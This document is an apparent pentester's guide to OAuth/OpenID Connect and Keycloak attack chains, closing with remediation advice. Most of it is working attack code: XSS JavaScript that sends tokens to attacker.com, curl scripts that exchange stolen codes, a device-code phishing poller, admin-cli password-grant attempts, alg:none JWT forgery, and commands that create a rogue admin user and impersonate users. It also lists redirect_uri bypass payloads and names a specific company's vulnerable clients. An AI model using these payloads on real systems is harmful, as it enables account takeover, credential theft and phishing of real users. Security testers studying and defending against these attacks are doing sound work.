# OAuth/SSO Attack Chains

Comprehensive attack chain methodology for OAuth 2.0 / OpenID Connect implementations. Goes beyond individual findings to document compound attack paths that escalate severity.

## Attack Surface Map

```
┌─────────────────────────────────────────────────────────────────┐
│                    OAuth/OIDC Attack Surface                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Authorization Endpoint (/authorize)                              │
│  ├── redirect_uri manipulation                                    │
│  ├── response_type downgrade (code → token)                       │
│  ├── scope escalation                                             │
│  ├── state parameter absence/prediction                           │
│  └── PKCE bypass (code_challenge omission)                        │
│                                                                   │
│  Token Endpoint (/token)                                          │
│  ├── grant_type abuse (password, client_credentials, device_code) │
│  ├── code replay                                                  │
│  ├── refresh token theft/replay                                   │
│  ├── client authentication bypass                                 │
│  └── token exchange abuse (RFC 8693)                              │
│                                                                   │
│  UserInfo Endpoint (/userinfo)                                    │
│  ├── CORS misconfiguration → cross-origin identity theft          │
│  ├── token validation bypass                                      │
│  └── scope-based data leakage                                     │
│                                                                   │
│  JWKS Endpoint (/.well-known/jwks.json)                           │
│  ├── Key confusion attacks                                        │
│  ├── Algorithm substitution                                       │
│  └── JKU/X5U injection                                            │
│                                                                   │
│  Discovery Endpoint (/.well-known/openid-configuration)           │
│  ├── Endpoint enumeration                                         │
│  ├── Supported grant types/scopes                                 │
│  └── Registration endpoint (if dynamic registration enabled)      │
│                                                                   │
│  Device Code Endpoint (/device)                                   │
│  ├── Social engineering (no redirect needed)                       │
│  ├── Polling-based code theft                                     │
│  └── Long-lived device codes                                      │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

## Attack Chain Patterns

### Chain 1: Open Redirect → Code Theft → Account Takeover

**Prerequisites:** OAuth client with open redirect_uri + public client (no secret)
**Severity:** Critical (8.1+)

```
Attacker crafts URL                    Victim clicks link
       │                                      │
       ▼                                      ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ /authorize?  │───▶│ Victim logs  │───▶│ Code sent to │
│ redirect_uri │    │ in normally  │    │ attacker.com │
│ =evil.com    │    │ (legit page) │    │ ?code=ABC123 │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
       ┌───────────────────────────────────────┘
       ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ POST /token  │───▶│ Access token │───▶│ Full account │
│ code=ABC123  │    │ + refresh    │    │ takeover     │
│ client_id=X  │    │ returned     │    │              │
└──────────────┘    └──────────────┘    └──────────────┘
```

**Exploitation:**
```bash
# Step 1: Craft phishing URL
PHISH_URL="https://keycloak.target.com/realms/prod/protocol/openid-connect/auth?\
client_id=public-app&\
redirect_uri=https://attacker.com/steal&\
response_type=code&\
scope=openid%20profile%20email&\
state=random123"

# Step 2: Attacker's server captures the code
# GET /steal?code=AUTH_CODE&session_state=...&state=random123

# Step 3: Exchange code for tokens (no client_secret needed for public clients)
curl -sk -X POST "https://keycloak.target.com/realms/prod/protocol/openid-connect/token" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=public-app" \
  -d "redirect_uri=https://attacker.com/steal"

# Step 4: Use access token
curl -sk -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://api.target.com/user/profile"
```

**Severity escalation factors:**
- No PKCE → code directly usable (+0.5)
- Public client → no secret needed (+0.5)
- Long-lived refresh token → persistent access (+0.5)
- Google Workspace SSO → victim sees familiar login, high success rate (+0.3)

---

### Browser vs Server URL Parse Differential

Many redirect_uri bypasses work because the OAuth server's URL parser and the browser's URL parser interpret the same string differently. Understanding this is key to crafting bypasses that pass server-side validation but redirect to attacker-controlled domains.

**WHATWG URL Standard (browsers) vs server-side parsers:**

| Payload | Browser navigates to | Python `urllib` sees | Java `URI` sees | Ruby `URI` sees | Go `url.Parse` sees |
|---|---|---|---|---|---|
| `https://legit.com@evil.com` | evil.com | evil.com (userinfo) | evil.com | evil.com | evil.com |
| `https://legit.com%40evil.com` | legit.com%40evil.com (single host) | legit.com@evil.com → evil.com | varies | varies | varies |
| `https://evil.com#@legit.com` | evil.com (fragment ignored for navigation) | evil.com | evil.com | evil.com | evil.com |
| `https://evil.com\@legit.com` | evil.com (backslash = path) | may see legit.com as host | varies | varies | varies |
| `https://legit.com\.evil.com` | evil.com (backslash normalized) | legit.com\.evil.com | legit.com\.evil.com | error | evil.com |
| `https://evil.com%00.legit.com` | evil.com (null terminates) | evil.com\x00.legit.com | error | error | varies |
| `https://legit.com:password@evil.com` | evil.com | evil.com | evil.com | evil.com | evil.com |
| `http://legit.com:80@evil.com:443/` | evil.com:443 | evil.com:443 | evil.com:443 | evil.com:443 | evil.com:443 |
| `https://legit.com%252f@evil.com` | evil.com (double-decode) | legit.com%2f@evil.com → varies | varies | varies | varies |

**Key insight:** The server validates the redirect_uri (checking if it starts with or contains the legitimate domain), but the BROWSER is what actually navigates. If the server's parser sees `legit.com` as the host but the browser navigates to `evil.com`, the bypass works.

**Testing methodology:**

```bash
# Test each parse-differential payload against the authorization endpoint
PAYLOADS=(
  "https://legit.com@evil.com/callback"
  "https://legit.com%40evil.com/callback"
  "https://evil.com#@legit.com/callback"
  "https://evil.com%23@legit.com/callback"
  "https://legit.com%00@evil.com/callback"
  "https://evil.com%252f@legit.com/callback"
  "https://legit.com\\@evil.com/callback"
  "https://evil.com:80\\@legit.com/callback"
)

for payload in "${PAYLOADS[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload', safe=''))")
  RESP=$(curl -sk -o /dev/null -w "%{http_code}" \
    "$AUTH_ENDPOINT?client_id=$CLIENT&redirect_uri=${encoded}&response_type=code&scope=openid")
  echo "  $payload → HTTP $RESP"
  # 302/200 (login page) = ACCEPTED (potential bypass)
  # 400 = REJECTED (server caught it)
done
```

**When to use this technique:**
- Standard redirect_uri=https://evil.com is rejected (server has SOME validation)
- But you suspect the validation is regex/string-based rather than proper URL parsing
- The server checks "does the redirect_uri contain legit.com" rather than "is the host legit.com"

**Severity:** If any parse-differential payload is accepted AND the browser would navigate to the attacker's domain, this is Critical (same as standard open redirect_uri).

---

### Chain 2: XSS on Trusted Subdomain → Token Theft

**Prerequisites:** XSS (even reflected) on any subdomain trusted by OAuth config + tokens in localStorage/cookies
**Severity:** Critical (XSS Low → Critical via chain)

```
XSS on blog.target.com          OAuth trusts *.target.com
       │                                │
       ▼                                ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ Inject JS on │───▶│ JS reads     │───▶│ Exfiltrate   │
│ trusted sub  │    │ localStorage │    │ to attacker  │
│              │    │ or cookies   │    │              │
└──────────────┘    └──────────────┘    └──────────────┘
```

**Exploitation (localStorage tokens):**
```javascript
// Injected via XSS on trusted subdomain
// If SPA stores tokens in localStorage (common pattern)
fetch('https://attacker.com/steal?' + new URLSearchParams({
  access_token: localStorage.getItem('access_token'),
  refresh_token: localStorage.getItem('refresh_token'),
  id_token: localStorage.getItem('id_token')
}));
```

**Exploitation (cookie-based sessions + CORS):**
```javascript
// If tokens are in httpOnly cookies, use CORS to steal data instead
fetch('https://api.target.com/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  }));
```

**Exploitation (silent OAuth flow via XSS):**
```javascript
// Force a silent re-auth to steal a fresh code
// Works even if tokens aren't in localStorage
var iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.src = 'https://keycloak.target.com/realms/prod/protocol/openid-connect/auth?' +
  'client_id=public-app&redirect_uri=https://blog.target.com/callback&' +
  'response_type=code&scope=openid&prompt=none';
document.body.appendChild(iframe);

// After redirect, extract code from iframe URL
setTimeout(() => {
  try {
    var code = new URL(iframe.contentWindow.location.href).searchParams.get('code');
    fetch('https://attacker.com/steal?code=' + code);
  } catch(e) {}
}, 3000);
```

---

### Chain 3: CORS Misconfiguration → Cross-Origin Identity Theft

**Prerequisites:** CORS reflects arbitrary origin + credentials on auth endpoints
**Severity:** Critical (standalone, no other vuln needed)

```
Victim visits attacker page       CORS allows evil.com
       │                                │
       ▼                                ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ Attacker's   │───▶│ XHR to       │───▶│ Response     │
│ page loads   │    │ /userinfo    │    │ includes PII │
│ in victim's  │    │ with creds   │    │ + identity   │
│ browser      │    │              │    │              │
└──────────────┘    └──────────────┘    └──────────────┘
```

**Combined with OAuth redirect:**
```
CORS on /userinfo + Open redirect on /authorize = Full ATO

1. Attacker page → silent OAuth flow (prompt=none) → gets fresh session cookie
2. Attacker page → CORS request to /userinfo → steals identity
3. Attacker page → CORS request to /token (if cookie-based) → steals tokens
```

---

### Chain 4: Refresh Token Theft → Persistent Access

**Prerequisites:** Any method to obtain refresh token (heapdump, XSS, network sniff, log exposure)
**Severity:** High → Critical (depends on token lifetime)

```bash
# Refresh tokens are long-lived (days/weeks/months)
# Even after password change, refresh tokens may remain valid

# Step 1: Obtain refresh token (from heapdump, XSS, logs, etc.)
REFRESH_TOKEN="eyJ..."

# Step 2: Exchange for new access token (indefinitely until revoked)
curl -sk -X POST "https://keycloak.target.com/realms/prod/protocol/openid-connect/token" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "client_id=public-app"

# Step 3: Check if refresh token survives password change
# (Many implementations don't revoke refresh tokens on password change)

# Step 4: Check refresh token lifetime
echo "$REFRESH_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.exp' | \
  xargs -I{} date -r {} 2>/dev/null || echo "Check exp claim"
```

**Key insight:** Refresh tokens from heapdumps may still be valid days/weeks later. Always test them even if the heapdump is old.

---

### Chain 5: Device Code Flow Abuse (Phishing Without Redirect)

**Prerequisites:** Device code grant enabled (common in Keycloak, Azure AD)
**Severity:** High (social engineering, but no suspicious redirect)

```bash
# Step 1: Check if device code flow is enabled
curl -sk "https://keycloak.target.com/realms/prod/.well-known/openid-configuration" | \
  jq '.grant_types_supported' | grep device

# Step 2: Initiate device code flow
DEVICE_RESP=$(curl -sk -X POST \
  "https://keycloak.target.com/realms/prod/protocol/openid-connect/auth/device" \
  -d "client_id=admin-cli" \
  -d "scope=openid")

DEVICE_CODE=$(echo "$DEVICE_RESP" | jq -r '.device_code')
USER_CODE=$(echo "$DEVICE_RESP" | jq -r '.user_code')
VERIFY_URI=$(echo "$DEVICE_RESP" | jq -r '.verification_uri_complete')

echo "Send this to victim: $VERIFY_URI"
echo "Or tell them to go to verification_uri and enter: $USER_CODE"

# Step 3: Poll for token (victim authenticates on their device)
while true; do
  TOKEN_RESP=$(curl -sk -X POST \
    "https://keycloak.target.com/realms/prod/protocol/openid-connect/token" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" \
    -d "device_code=$DEVICE_CODE" \
    -d "client_id=admin-cli")
  
  if echo "$TOKEN_RESP" | jq -e '.access_token' > /dev/null 2>&1; then
    echo "GOT TOKEN: $(echo $TOKEN_RESP | jq -r '.access_token')"
    break
  fi
  sleep 5
done
```

**Why this is dangerous:**
- No suspicious redirect URL (victim goes to legitimate verification page)
- Works on any device (victim can auth on their phone)
- Attacker never sees victim's password
- Hard to detect (looks like normal device auth)

---

### Chain 6: Scope Escalation

**Prerequisites:** Token endpoint doesn't validate requested scopes against client config
**Severity:** Medium → High

```bash
# Step 1: Get a token with normal scopes
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=password&client_id=public-app&username=user&password=pass&scope=openid"

# Step 2: Request elevated scopes
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=password&client_id=public-app&username=user&password=pass&scope=openid+admin+realm-management"

# Step 3: Try refresh with elevated scopes
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=refresh_token&refresh_token=$RT&client_id=public-app&scope=openid+admin"

# Step 4: Compare token claims
echo "$TOKEN1" | cut -d. -f2 | base64 -d | jq '.scope, .realm_access, .resource_access'
echo "$TOKEN2" | cut -d. -f2 | base64 -d | jq '.scope, .realm_access, .resource_access'
```

---

### Chain 7: Token Replay Across Environments

**Prerequisites:** Same signing key used across environments, or audience not validated
**Severity:** High (dev/staging token works on prod)

```bash
# Step 1: Get token from lower environment (easier to obtain)
# e.g., from heapdump on mock/dev, or from a test account on staging
DEV_TOKEN="eyJ..."

# Step 2: Decode and check audience/issuer
echo "$DEV_TOKEN" | cut -d. -f2 | base64 -d | jq '{iss, aud, azp, realm_access}'

# Step 3: Try token against production
curl -sk -H "Authorization: Bearer $DEV_TOKEN" "https://api.prod.target.com/user/profile"

# Step 4: If rejected, check if the signing key is the same
# (compare JWKS endpoints across environments)
diff <(curl -sk "https://keycloak.dev.target.com/realms/app/protocol/openid-connect/certs" | jq '.keys[0].n') \
     <(curl -sk "https://keycloak.prod.target.com/realms/app/protocol/openid-connect/certs" | jq '.keys[0].n')
# If same → tokens are interchangeable (Critical)
```

---

### Chain 8: PKCE Downgrade Attack

**Prerequisites:** Server supports PKCE but doesn't REQUIRE it
**Severity:** Escalates open redirect from Medium to Critical

```bash
# Step 1: Check if PKCE is required or optional
# Send auth request WITHOUT code_challenge
curl -sk -o /dev/null -w "%{http_code}" \
  "$AUTH_ENDPOINT?client_id=app&redirect_uri=https://legit.com/cb&response_type=code&scope=openid"
# 302 (login page) = PKCE NOT required → code is usable without verifier
# 400 "code_challenge required" = PKCE enforced → code alone is useless

# Step 2: If PKCE not required, open redirect becomes Critical
# Because stolen authorization code can be exchanged directly:
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=authorization_code&code=STOLEN_CODE&client_id=app&redirect_uri=https://evil.com"
# No code_verifier needed!
```

**Key insight:** PKCE is the ONLY defense against authorization code theft via open redirect. If PKCE is optional, any redirect_uri bypass = full account takeover.

---

### Device Code Flow Abuse (RFC 8628)

**Detection:** Check `.well-known/openid-configuration` for `device_authorization_endpoint`. Common on ArgoCD/Dex, Azure AD, Okta, Google Workspace.

**Attack chain:**
1. Request device code (no auth required): `POST /device/code` with `client_id` + `scope`
2. Receive `device_code`, `user_code`, `verification_uri_complete`
3. Send `verification_uri_complete` to victim (legitimate domain URL — bypasses email/URL filters)
4. Poll token endpoint: `POST /token` with `grant_type=urn:ietf:params:oauth:grant-type:device_code`
5. Returns `authorization_pending` until victim authorizes, then returns valid JWT

**Why it's dangerous:**
- Phishing URL is on the LEGITIMATE service domain (not attacker-controlled)
- No redirect_uri validation needed (device flow doesn't use redirects)
- Works even when `userLoginsDisabled: true` (SSO-only environments)
- Codes can be generated unlimited times without rate limiting (usually)
- `offline_access` scope often grants refresh tokens (persistent access)

**Common targets:**
- ArgoCD + Dex (K8s deployment tool) — `client_id=argo-cd` or `argo-cd-cli`
- Azure AD device code flow — `client_id` from app registration
- Vault, Consul, Boundary (HashiCorp) — if OIDC auth configured
- Grafana with OAuth — if device code grant enabled

**Testing procedure:**
```bash
# 1. Discover device auth endpoint
curl -sk "$ISSUER/.well-known/openid-configuration" | jq .device_authorization_endpoint

# 2. Request device code
curl -sk -X POST "$DEVICE_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=$CLIENT_ID&scope=openid+profile+email+groups+offline_access"

# 3. Poll for token (run in loop every 5s)
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=$DEVICE_CODE&client_id=$CLIENT_ID"
```

**Severity guidance:**
- Device code flow accessible + sensitive service (ArgoCD, Vault) = High (8.0+)
- Device code flow accessible + low-value service = Medium
- If `execEnabled: true` on ArgoCD or similar RCE capability = Critical

**Reporting note:** Frame as "exposed internal service with device code phishing vector" — not as "social engineering." The finding is the exposed service + unauthenticated device code generation. Social engineering is the impact amplifier, not the vulnerability itself.

### Keycloak-Specific Chains

### KC-1: Public Client Enumeration → Redirect Bypass → Code Theft

```bash
# Keycloak default public clients (always try these)
KC_CLIENTS=("admin-cli" "account" "account-console" "broker" "realm-management" "security-admin-console")

# Enumerate which are public vs confidential
for client in "${KC_CLIENTS[@]}"; do
  RESP=$(curl -sk -X POST "$TOKEN_ENDPOINT" \
    -d "grant_type=client_credentials&client_id=$client" \
    -w "\n%{http_code}")
  CODE=$(echo "$RESP" | tail -1)
  BODY=$(echo "$RESP" | head -1)
  
  if echo "$BODY" | grep -q "Public client not allowed"; then
    echo "[PUBLIC] $client — try password grant or redirect_uri"
  elif echo "$BODY" | grep -q "Invalid client"; then
    echo "[MISSING] $client"
  elif echo "$BODY" | grep -q "unauthorized_client"; then
    echo "[CONFIDENTIAL] $client — needs secret"
  fi
done
```

### KC-2: admin-cli Abuse

`admin-cli` is a default Keycloak public client that exists in EVERY realm. It's intended for CLI admin tools but:
- It's public (no secret required)
- It often has NO redirect_uri restrictions
- It can be used for password grant (if direct access grants enabled)

```bash
# Try password grant with admin-cli
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=password&client_id=admin-cli&username=admin&password=admin"

# Try with discovered credentials (from CTI, heapdump, etc.)
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -d "grant_type=password&client_id=admin-cli&username=$USER&password=$PASS"

# Check token roles (admin-cli tokens may have realm-admin)
echo "$TOKEN" | cut -d. -f2 | base64 -d | jq '.realm_access.roles'
```

### KC-3: Realm Confusion

```bash
# Enumerate all realms
for realm in master prod staging dev internal admin employee partner; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://keycloak.target.com/realms/$realm/.well-known/openid-configuration")
  [ "$CODE" = "200" ] && echo "[+] Realm exists: $realm"
done

# Test if token from one realm is accepted by services in another
# (misconfigured audience validation)
DEV_TOKEN=$(get_token_from_dev_realm)
curl -sk -H "Authorization: Bearer $DEV_TOKEN" "https://api.target.com/prod-service/"
```

### KC-4: Service Account Token Escalation

```bash
# If you have a service account token (from heapdump, CI/CD leak):
SA_TOKEN="eyJ..."

# Check what it can do
echo "$SA_TOKEN" | cut -d. -f2 | base64 -d | jq '{
  azp: .azp,
  roles: .realm_access.roles,
  resource_access: .resource_access,
  scope: .scope
}'

# If it has realm-management or admin roles:
# Enumerate all users
curl -sk -H "Authorization: Bearer $SA_TOKEN" \
  "https://keycloak.target.com/admin/realms/prod/users?max=100"

# Create admin user
curl -sk -X POST -H "Authorization: Bearer $SA_TOKEN" \
  -H "Content-Type: application/json" \
  "https://keycloak.target.com/admin/realms/prod/users" \
  -d '{"username":"pentest-admin","enabled":true,"credentials":[{"type":"password","value":"P3nt3st!","temporary":false}]}'

# Impersonate any user
curl -sk -X POST -H "Authorization: Bearer $SA_TOKEN" \
  "https://keycloak.target.com/admin/realms/prod/users/$USER_ID/impersonation"
```

---

## Token Analysis Methodology

### Step 1: Decode and Inspect

```bash
# Decode JWT (all three parts)
decode_jwt() {
  echo "$1" | cut -d. -f1 | base64 -d 2>/dev/null | jq . 2>/dev/null
  echo "---"
  echo "$1" | cut -d. -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null
}

# Key claims to check:
# - iss (issuer) — which Keycloak instance/realm
# - aud (audience) — which services should accept this
# - azp (authorized party) — which client obtained this
# - exp (expiration) — how long is it valid
# - scope — what permissions
# - realm_access.roles — Keycloak realm roles
# - resource_access.{client}.roles — client-specific roles
```

### Step 2: Audience Validation Testing

```bash
# Get token intended for service A
TOKEN_A=$(get_token_for_service_a)

# Try it against service B (should be rejected if audience is validated)
curl -sk -H "Authorization: Bearer $TOKEN_A" "https://service-b.target.com/api/"

# If accepted → audience not validated → any token works everywhere
# This is Critical for multi-service architectures
```

### Step 3: Signature Verification Testing

```bash
# Test alg:none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=')
PAYLOAD=$(echo "$TOKEN" | cut -d. -f2)
FORGED="${HEADER}.${PAYLOAD}."
curl -sk -H "Authorization: Bearer $FORGED" "$API_ENDPOINT"

# Test algorithm confusion (RS256 → HS256)
# Get the public key
PUB_KEY=$(curl -sk "$JWKS_ENDPOINT" | jq -r '.keys[0]')
# Sign with public key as HMAC secret (requires jwt_tool or custom script)
# python3 -c "import jwt; print(jwt.encode({'sub':'admin'}, open('pub.pem').read(), algorithm='HS256'))"

# Test with empty signature
NOSIG="${HEADER}.${PAYLOAD}.AAAA"
curl -sk -H "Authorization: Bearer $NOSIG" "$API_ENDPOINT"
```

### Step 4: Token Lifetime Analysis

```bash
# Check access token lifetime
echo "$ACCESS_TOKEN" | cut -d. -f2 | base64 -d | jq '{
  issued: (.iat | todate),
  expires: (.exp | todate),
  lifetime_seconds: (.exp - .iat)
}'

# Check refresh token lifetime (if JWT format)
echo "$REFRESH_TOKEN" | cut -d. -f2 | base64 -d | jq '{
  issued: (.iat | todate),
  expires: (.exp | todate),
  lifetime_days: ((.exp - .iat) / 86400)
}'

# Findings:
# Access token > 1 hour → Medium (excessive lifetime)
# Access token > 24 hours → High
# Refresh token > 30 days → Medium
# Refresh token never expires → High
# Refresh token survives password change → Critical
```

---

## Chaining with Other Findings

### CORS + OAuth = Identity Theft

```
CORS reflection on /userinfo (standalone: Critical)
+ Active session (victim logged in)
= Cross-origin PII theft without any user interaction beyond visiting attacker page
```

### Heapdump + OAuth = Persistent Access

```
Heapdump exposure (standalone: Critical)
+ Contains refresh tokens or client secrets
= Persistent access to all services, survives password rotation
+ Service account with realm-admin role
= Full Keycloak admin access → create users, impersonate anyone
```

### XSS + OAuth = Account Takeover

```
Reflected XSS on trusted subdomain (standalone: Low/Medium)
+ OAuth trusts *.target.com origins
+ Tokens in localStorage OR CORS allows credentialed requests
= Full account takeover via single click
```

### Open Redirect + No PKCE = Code Theft

```
Open redirect_uri on OAuth client (standalone: Medium if PKCE enforced)
+ PKCE not required (code usable without verifier)
+ Public client (no secret needed for exchange)
= Full account takeover via phishing link (Critical)
```

### Gateway Drift + OAuth = Partial Fix Bypass

```
OAuth redirect_uri fixed on primary gateway
+ Parallel gateway (bravo) not patched
= Same attack works via alternate gateway path
```

### Severity Escalation Table

| Base Finding | Combined With | Escalated Severity | Rationale |
|---|---|---|---|
| Open redirect_uri (Medium) | No PKCE + public client | Critical (8.1) | Code directly exchangeable |
| Reflected XSS on subdomain (Low) | OAuth token in localStorage | Critical (9.0) | Full ATO via single click |
| CORS reflection (Critical) | Active OAuth session | Critical (9.8) | Zero-click identity theft |
| Heapdump (Critical) | Contains SA refresh token | Critical (10.0) | Persistent admin access |
| Device code enabled (Info) | Social engineering context | High (7.1) | Phishing without redirect |
| Refresh token > 90 days (Medium) | No revocation on password change | High (8.0) | Persistent access post-breach |

---

## Testing Checklist (Ordered by ROI)

### Quick Wins (5-10 min each)

- [ ] Discover all OAuth endpoints via `.well-known/openid-configuration`
- [ ] Enumerate public clients (admin-cli, account, app-specific)
- [ ] Test redirect_uri=https://evil.com on each public client
- [ ] Check if PKCE is required (send auth request without code_challenge)
- [ ] Test CORS on /userinfo and /token endpoints
- [ ] Decode any available tokens (from JS, heapdump, network)
- [ ] Check token lifetime (access + refresh)

### Medium Effort (15-30 min each)

- [ ] Test device code flow availability
- [ ] Enumerate all realms (Keycloak)
- [ ] Test token replay across environments
- [ ] Test audience validation (token from service A on service B)
- [ ] Test scope escalation on token endpoint
- [ ] Check refresh token survival after password change
- [ ] Test algorithm confusion (alg:none, RS256→HS256)

### Deep Dive (30-60 min each)

- [ ] Full client enumeration via JS bundle extraction
- [ ] Service account token escalation (if obtained)
- [ ] Impersonation flow testing
- [ ] Token exchange (RFC 8693) abuse
- [ ] Dynamic client registration (if endpoint exists)
- [ ] Backchannel logout validation

---

## Real-World Examples (BFI Finance, May 2026)

### Finding: All Public Clients Accept Arbitrary redirect_uri

**Discovery path:**
1. Phase 1: JS bundle analysis revealed client_ids (`los-operation`, `los-surveyor`)
2. Phase 3: Keycloak `.well-known` endpoint confirmed authorization URL
3. Phase 5: redirect_uri testing showed NO validation on any client
4. Phase 6: Confirmed public client (no secret), no PKCE required

**Chain:**
```
Phishing URL (legitimate domain) → Victim authenticates via Google SSO
→ Code redirected to attacker → Token exchange (no secret, no PKCE)
→ Full access to victim's account and all services
```

**Combined with CORS finding:**
```
CORS reflection on /userinfo → steal identity of any logged-in employee
+ Open redirect → steal authorization code of any employee who clicks link
= Two independent paths to account takeover (defense-in-depth failure)
```

**Severity:** Critical (8.1) — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N

### Reporting Format for Attack Chains

```markdown
## [FINDING-N] OAuth Authorization Code Theft via Open Redirect

**Severity:** Critical
**CVSS 3.1:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
**Attack Chain:** Open redirect_uri + Public client + No PKCE

### Attack Flow
1. Attacker crafts authorization URL with redirect_uri=https://evil.com
2. Victim clicks link → sees legitimate Google SSO login
3. After authentication, code is sent to attacker's server
4. Attacker exchanges code for tokens (no secret or PKCE verifier needed)
5. Attacker has full access to victim's account

### Chain Components
| # | Component | Individual Severity | Role in Chain |
|---|-----------|-------------------|---------------|
| 1 | No redirect_uri validation | Medium | Enables code redirection |
| 2 | Public client (no secret) | Low | Enables code exchange without secret |
| 3 | No PKCE enforcement | Low | Makes stolen code directly usable |
| 4 | Google SSO (familiar login) | Info | Increases phishing success rate |

### Combined Severity Justification
Individual components are Low-Medium, but combined they create a Critical attack path
requiring only a single user click on a legitimate-looking URL. No technical prerequisites
for the attacker beyond hosting a web server.

### Affected Clients
| Client ID | redirect_uri Validated | PKCE Required | Secret Required |
|-----------|----------------------|---------------|-----------------|
| los-operation | ❌ No | ❌ No | ❌ No (public) |
| los-surveyor | ❌ No | ❌ No | ❌ No (public) |
| admin-cli | ❌ No | ❌ No | ❌ No (public) |
| account | ❌ No | ❌ No | ❌ No (public) |
```

---

## Remediation Recommendations

### Immediate (Critical)
1. **Enforce redirect_uri whitelist** — exact match, no wildcards, no regex
2. **Require PKCE** for all public clients (Keycloak: set "Proof Key for Code Exchange Code Challenge Method" to S256)
3. **Fix CORS** — remove origin reflection, whitelist specific trusted origins only

### Short-term (High)
4. **Convert public clients to confidential** where possible
5. **Reduce token lifetimes** — access: 5-15 min, refresh: 8-24 hours
6. **Revoke refresh tokens on password change**
7. **Disable device code flow** if not needed
8. **Validate audience** in all services (reject tokens not intended for them)

### Medium-term (Architecture)
9. **Implement token binding** (DPoP - RFC 9449)
10. **Enable Keycloak AuthorizationPolicy** at mesh level
11. **Centralize OAuth config** via GitOps (prevent gateway drift)
12. **Add anomaly detection** on token endpoint (unusual grant types, rapid token exchange)
